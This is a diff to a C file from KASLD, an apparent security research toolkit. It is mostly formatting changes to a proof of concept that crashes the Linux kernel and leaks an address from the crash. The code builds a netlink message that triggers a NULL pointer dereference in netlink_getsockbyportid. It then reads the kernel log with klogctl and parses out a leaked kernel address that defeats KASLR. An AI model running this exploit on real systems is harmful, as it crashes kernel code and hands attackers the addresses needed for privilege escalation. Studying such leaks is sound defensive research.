@@ -1,23 +1,27 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
-// Trigger kernel oops netlink_getsockbyportid null pointer deref and search syslog for splat
+//
+// Trigger kernel oops netlink_getsockbyportid null pointer deref and search
+// syslog for splat.
+//
 // Requires:
 // - kernel.unprivileged_userns_clone = 1; (Default on Ubuntu systems)
-// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
+//
 // Based on original trigger PoC code by vn1k:
 // - https://github.com/duasynt/meh/blob/master/nfnetlink1019.c
 
 #define _GNU_SOURCE
 
+#include <linux/netlink.h>
+#include <sched.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <sched.h>
 #include <sys/klog.h>
 #include <sys/mman.h>
 #include <sys/socket.h>
 #include <sys/utsname.h>
-#include <linux/netlink.h>
+#include <unistd.h>
 
 // https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
 unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
@@ -47,7 +51,7 @@ int trigger_oops(void) {
   struct msghdr msg;
 
   memset(&msg, 0, sizeof(msg));
-  memset(iov,  0, sizeof(iov));
+  memset(iov, 0, sizeof(iov));
 
   int buf[64];
   memset(buf, 0, sizeof(buf));
@@ -56,9 +60,9 @@ int trigger_oops(void) {
 
   iov[0].iov_base = buf;
   iov[0].iov_len = 0xa0;
-  buf[0] = 0xa0; // len 
+  buf[0] = 0xa0;           // len
   buf[1] = NLMSG_MIN_TYPE; // type
-  msg.msg_iov    = iov;
+  msg.msg_iov = iov;
   msg.msg_iovlen = 1;
 
   sendmsg(s, &msg, 0x40000);
@@ -69,7 +73,7 @@ int trigger_oops(void) {
 #define SYSLOG_ACTION_READ_ALL 3
 #define SYSLOG_ACTION_SIZE_BUFFER 10
 
-int mmap_syslog(char** buffer, int* size) {
+int mmap_syslog(char **buffer, int *size) {
   *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
 
   if (*size == -1) {
@@ -78,7 +82,8 @@ int mmap_syslog(char** buffer, int* size) {
   }
 
   *size = (*size / getpagesize() + 1) * getpagesize();
-  *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  *buffer = (char *)mmap(NULL, *size, PROT_READ | PROT_WRITE,
+                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
   *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
 
@@ -90,26 +95,26 @@ int mmap_syslog(char** buffer, int* size) {
   return 0;
 }
 
-unsigned long search_dmesg(char* needle) {
-  char* syslog;
+unsigned long search_dmesg(char *needle) {
+  char *addr_buf;
+  char *syslog;
+  char *substr;
   int size;
-  const int addr_len = 16; /* 64-bit */
+  char *endptr;
   unsigned long addr = 0;
 
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  char* substr = (char*)memmem(&syslog[0], size, needle, strlen(needle));
+  substr = (char *)memmem(&syslog[0], size, needle, strlen(needle));
   if (substr == NULL)
     return 0;
 
-  char *addr_buf;
   addr_buf = strstr(substr, "<ffffffff");
   if (addr_buf == NULL)
     return 0;
 
-  char* endptr = &addr_buf[addr_len];
-  addr = strtoul(&addr_buf[1], &endptr, 16);
+  addr = strtoull(&addr_buf[1], &endptr, 16);
 
   if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
     return addr;
@@ -117,7 +122,7 @@ unsigned long search_dmesg(char* needle) {
   return 0;
 }
 
-int main (int argc, char **argv) {
+int main(int argc, char **argv) {
   printf("[.] trying netlink_unicast null pointer dereference ...\n");
 
   struct utsname u = get_kernel_version();
@@ -150,7 +155,8 @@ int main (int argc, char **argv) {
   printf("[.] searching dmesg for %s ...\n", needle);
 
   unsigned long addr = search_dmesg(needle);
-  if (!addr) return 1;
+  if (!addr)
+    return 1;
 
   printf("leaked address: %lx\n", addr);
 
@@ -159,4 +165,3 @@ int main (int argc, char **argv) {
 
   return 0;
 }
-
